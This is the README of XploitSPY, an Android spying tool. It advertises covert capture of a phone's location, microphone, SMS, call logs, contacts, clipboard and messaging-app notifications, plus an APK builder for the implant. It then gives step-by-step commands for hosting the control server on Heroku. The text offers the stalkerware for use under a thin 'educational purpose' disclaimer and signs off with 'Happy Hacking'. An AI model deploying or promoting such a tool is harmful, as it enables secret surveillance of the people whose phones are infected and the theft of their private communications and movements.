<p align="center">
<img src="https://github.com/XploitWizer/XploitSPY/blob/herooku/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Spying or Monitoring Tool, powered by NodeJS
</p>

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Installation on Server and VPS [Click Here](https://github.com/Xploitwizer/XploitSPY)

## Installation on Heroku Free Server

 Video Tutorial for Heroku [Click Here](https://youtu.be/IoJGFZWCPko)


0. Create a Account on [Heroku](https://heroku.com)

1. Click `Create New App` in Heroku Dashboard

2. Enter App Name and click on create app

3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)

4. Now open your terminal and run command `git clone -b herooku https://github.com/XploitWizer/XploitSPY`

5. It will download Latest codes for you in your PC
    
6. Now change the directory to XploitSPY using command `cd XploitSPY`

7. Now Login into Heroku CLI using command `heroku login -i` now enter your login details and hit Enter

8. After Login run this command in terminal `heroku git:remote -a appName` here appName will be your app's name that you choose while creating the app.

9. Now run follow commands in termial to install packages `heroku buildpacks:add heroku/jvm` then run `heroku buildpacks:add heroku/nodejs`

10. Now run this command in your terminal `git push heroku herooku:master`, if this gives an error try this `git push -f heroku herooku:master`

11. All done now it will take time to complete, after that you can visit your domain shown in terminal.
    
## Happy Hacking

## Disclaimer
<b>XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
XploitSPY is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>
Apt update && apt upgrade

